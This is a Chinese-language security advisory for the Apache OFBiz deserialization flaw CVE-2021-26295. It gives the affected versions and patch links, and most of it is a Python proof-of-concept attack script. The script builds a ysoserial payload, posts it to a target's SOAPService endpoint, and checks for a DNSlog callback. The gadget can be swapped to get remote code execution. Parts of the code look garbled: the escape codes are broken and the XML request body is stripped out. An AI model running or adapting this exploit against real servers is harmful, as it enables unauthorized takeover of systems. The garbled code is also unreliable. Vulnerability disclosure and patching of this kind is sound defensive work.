## 1、漏洞描述

 **Apache OFBiz反序列化漏洞（CVE-2021-26295）**

Apache
OFBiz是一个非常著名的电子商务平台，提供了创建基于最新J2EE/XML规范和技术标准，构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类WEB应用系统的框架。

2021年3月22日 Apache
OFBiz官方发布安全更新，修复了一处由RMI反序列化造成的远程代码执行漏洞。攻击者可构造恶意请求，触发反序列化，从而造成任意代码执行，控制服务器。

## 2、影响版本

Apache OFBiz < 17.12.06

## 3、修复建议

1、Apache
OFBiz更新至最新版，下载地址：https://ofbiz.apache.org/download.html#vulnerabilities  
2、下载应用漏洞补丁，下载地址：https://github.com/apache/ofbiz-fr amework/commit/af9ed4e/

## 4、POC

下载地址：http://peiqi.tech/shentou/CVE-2021-26295.zip

> import requests  
> import sys  
> import sys  
> import subprocess  
> import binascii  
> from requests.packages.urllib3.exceptions import InsecureRequestWarning  
>  
> def title():  
> print('+------------------------------------------')  
> print('+ 33[34mPOC_Des: http://wiki.peiqi.tech 33[0m')  
> print('+ 33[34mGithub : https://github.com/PeiQi0 33[0m')  
> print('+ 33[34m公众号 : PeiQi文库 33[0m')  
> print('+ 33[34mVersion: Apache OFBiz 33[0m')  
> print('+ 33[36m使用格式: python3 poc.py 33[0m')  
> print('+ 33[36mUrl >>> http://xxx.xxx.xxx.xxx 33[0m')  
> print('+ 33[36mDnslog >>> http://xxx.xxx.xxx.xxx 33[0m')  
> print('+------------------------------------------')  
>  
> def trans(s):  
> return "%s" % ''.join('%.2x' % x for x in s)  
>  
> def POC_1(target_url, Dnslog):  
> popen = subprocess.Popen(['java', '-jar', 'ysoserial.jar', "URLDNS",
> Dnslog], stdout=subprocess.PIPE)  
> data = popen.stdout.read()  
> hex_data = trans(data)  
> headers = {  
>  'Content-Type': 'text/xml'  
> }  
> post_data = '''%s''' % hex_data  
> vuln_url = target_url + "/webtools/control/SOAPService"  
> try:  
>  requests.packages.urllib3.disable_warnings(InsecureRequestWarning)  
>  response = requests.post(url=vuln_url, data=post_data, headers=headers,
> verify=False, timeout=5)  
>  print("33[36m[o] 正在请求 {}/webtools/control/SOAPService.....
> 33[0m".format(target_url))  
>  if response.status_code == 200:  
>  print("33[36m[o] 请检查 Dnslog 响应n 33[0m")  
>  else:  
>  print("33[31m[x] 请求失败 33[0m")  
>  sys.exit(0)  
>  
> except Exception as e:  
>  print("33[31m[x] 请求失败 33[0m")  
>  
>  
> if __name__ == '__main__':  
> title()  
> target_url = str(input("33[35mPlease input Attack UrlnUrl >>> 33[0m"))  
> Dnslog = str(input("33[35mDnslog >>> 33[0m"))  
> POC_1(target_url, Dnslog)

  

  

  

